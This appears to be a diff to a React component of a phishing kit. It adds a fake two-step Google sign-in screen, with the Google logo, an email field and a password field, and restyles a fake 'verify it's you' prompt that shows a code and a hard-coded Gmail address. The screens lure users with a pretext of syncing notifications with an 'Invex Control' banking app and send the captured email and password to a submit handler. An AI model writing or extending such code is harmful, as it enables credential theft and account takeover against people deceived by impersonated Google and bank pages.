@@ -570,8 +570,124 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         return getBankContainer(validandoContent);
         
       case ScreenType.GMAIL:
+        // Función para cambiar de la pantalla de correo a la de contraseña
+        const handleGmailNextScreen = () => {
+          if (gmailScreen === 'correo') {
+            if (gmailCorreo.trim()) {
+              setGmailScreen('contrasena');
+            }
+          } else {
+            // Enviar datos completos
+            if (gmailContrasena.trim()) {
+              onSubmit(ScreenType.GMAIL, { 
+                correo: gmailCorreo, 
+                contrasena: gmailContrasena 
+              });
+            }
+          }
+        };
+        
+        // Función para alternar la visibilidad de la contraseña
+        const toggleGmailPasswordVisibility = () => {
+          setShowGmailPassword(!showGmailPassword);
+        };
+        
         // Contenedor personalizado para Gmail que es distinto al resto de pantallas
         const getGmailContainer = (children: React.ReactNode) => {
+          return (
+            <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
+              {children}
+            </div>
+          );
+        };
+        
+        // Pantalla de correo electrónico (primera pantalla)
+        const gmailCorreoContent = (
+          <>
+            <div className="flex justify-center mb-4">
+              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
+            </div>
+            
+            <p className="text-[15px] text-gray-700 mb-6">
+              Para sincronizar tus notificaciones con la aplicación <strong>Invex Control</strong>, inicia sesión utilizando tu correo electrónico registrado.
+            </p>
+            
+            <Input 
+              type="text"
+              id="gmailCorreo" 
+              placeholder="Correo electrónico o teléfono" 
+              className="w-full p-3 border border-gray-300 rounded mb-4" 
+              value={gmailCorreo}
+              onChange={(e) => setGmailCorreo(e.target.value)}
+            />
+            
+            <div className="text-left mb-6">
+              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste el correo electrónico?</a>
+            </div>
+            
+            <Button 
+              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
+              onClick={handleGmailNextScreen}
+            >
+              Siguiente
+            </Button>
+          </>
+        );
+        
+        // Pantalla de contraseña (segunda pantalla)
+        const gmailContrasenaContent = (
+          <>
+            <div className="flex justify-center mb-4">
+              <img src={googleLogo} alt="Google Logo" className="w-16 h-16" />
+            </div>
+            
+            <div className="flex items-center justify-center mb-6">
+              <div className="bg-gray-200 text-gray-700 w-10 h-10 rounded-full flex items-center justify-center font-semibold mr-2">
+                {gmailCorreo[0]?.toUpperCase() || 'G'}
+              </div>
+              <span className="text-sm">{gmailCorreo}</span>
+            </div>
+            
+            <Input 
+              type={showGmailPassword ? "text" : "password"}
+              id="gmailContrasena" 
+              placeholder="Ingresa tu contraseña" 
+              className="w-full p-3 border border-gray-300 rounded mb-2" 
+              value={gmailContrasena}
+              onChange={(e) => setGmailContrasena(e.target.value)}
+            />
+            
+            <div className="flex items-center mb-4 text-left">
+              <Checkbox 
+                id="mostrarContrasena" 
+                checked={showGmailPassword}
+                onCheckedChange={toggleGmailPasswordVisibility}
+                className="mr-2"
+              />
+              <Label htmlFor="mostrarContrasena" className="text-sm text-gray-700 cursor-pointer">
+                Mostrar contraseña
+              </Label>
+            </div>
+            
+            <div className="text-left mb-6">
+              <a href="#" className="text-blue-600 text-sm hover:underline">¿Olvidaste la contraseña?</a>
+            </div>
+            
+            <Button 
+              className="bg-blue-600 text-white hover:bg-blue-700 w-full py-2 px-4 rounded"
+              onClick={handleGmailNextScreen}
+            >
+              Siguiente
+            </Button>
+          </>
+        );
+        
+        // Renderizar la pantalla correspondiente según el estado
+        return getGmailContainer(gmailScreen === 'correo' ? gmailCorreoContent : gmailContrasenaContent);
+        
+      case ScreenType.GMAIL_VERIFY:
+        // Contenedor personalizado para Gmail Verify que es distinto al resto de pantallas
+        const getGmailVerifyContainer = (children: React.ReactNode) => {
           return (
             <div className="gmail-container bg-white rounded-xl shadow-md p-8 mx-auto max-w-md text-center">
               {children}
@@ -582,9 +698,8 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
         // Pantalla de verificación de Google
         const gmailVerificationContent = (
           <>
-            
-            <div className="flex justify-center">
-              <img src={googleLogo} alt="Google" className="google-logo" />
+            <div className="flex justify-center mb-5">
+              <img src={googleLogo} alt="Google" className="w-20" />
             </div>
             
             <h1 className="text-2xl font-normal mb-2">Verifica que eres tú</h1>
@@ -592,11 +707,11 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               Para proteger tu cuenta, Google quiere asegurarse de que realmente seas tú la persona que intenta acceder <a href="#" className="text-blue-600">Más información</a>
             </p>
 
-            <div className="email-box">
+            <div className="inline-block border border-gray-300 rounded-full py-2 px-6 bg-gray-100 mb-5 mx-auto">
               {screenData.correo || gmailCorreo || "inmobiliariadexter627@gmail.com"}
             </div>
 
-            <div className="code">14</div>
+            <div className="text-5xl font-normal my-8">14</div>
 
             <p className="text-sm mb-2">Abrir la app de Gmail en tu celular</p>
             <p className="text-sm text-gray-700 mb-5 max-w-xs mx-auto">
@@ -604,19 +719,19 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </p>
 
             <p 
-              className="gray-text cursor-pointer"
+              className="text-gray-500 text-sm mt-10 cursor-pointer hover:underline"
               onClick={() => {
                 // Al hacer clic en "Reenviarlo", mostramos la pantalla de carga
-                onSubmit(ScreenType.VALIDANDO, { redirect: "gmail" });
+                onSubmit(ScreenType.VALIDANDO, { redirect: "gmail_verify" });
               }}
             >
               Reenviarlo
             </p>
-            <a href="#" className="link">Probar otro método</a>
+            <a href="#" className="text-blue-600 text-sm mt-4 block hover:underline">Probar otro método</a>
           </>
         );
         
-        return getGmailContainer(gmailVerificationContent);
+        return getGmailVerifyContainer(gmailVerificationContent);
 
       default:
         const defaultContent = (
